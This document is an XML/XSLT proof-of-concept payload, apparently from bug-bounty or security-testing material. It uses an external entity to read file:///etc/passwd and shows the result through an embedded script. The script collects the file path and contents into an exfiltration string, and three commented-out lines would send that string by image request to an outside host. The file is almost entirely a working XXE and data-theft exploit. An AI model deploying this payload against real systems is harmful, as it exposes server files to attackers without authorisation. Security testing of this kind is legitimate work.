<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="#"?>
<!DOCTYPE div [
	<!ENTITY passwd_p        "file:///etc/passwd">
	<!ENTITY passwd_c SYSTEM "file:///etc/passwd">
]>

<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
	<xsl:template match="/">
    <xsl:copy-of select="document('')"/>
	
		<body xmlns="http://www.w3.org/1999/xhtml">
			<div style="display:none">
				<p class="&passwd_p;">&passwd_c;</p>
			</div>
			<div style="width:40rem" id="r"></div>
			<script>
				let exfilData = '';
				document.querySelectorAll('p').forEach(p => {
					const filePath = p.className;
					const fileContent = p.innerHTML;
					
					
					document.querySelector('#r').innerHTML += `
local file path:   &lt;textarea style="width:100%;height:2rem">${ filePath }&lt;/textarea>&lt;br/>
local file content:&lt;textarea style="width:100%;height:30rem">${ fileContent }&lt;/textarea>&lt;br/>&lt;br/>`;


					exfilData += `Path: ${filePath}\\nContent: ${fileContent}\\n\\n`;
				});	
					
				//The 3 commented lines below are to exfil the data to a server you own
				//const img = new Image();
				//img.src = `https:/i.hackwithnahamsec.com/poc-exfil?data=${encodeURIComponent(exfilData)}`;
				//document.body.appendChild(img);				
			</script>
		</body>
	</xsl:template>
</xsl:stylesheet>
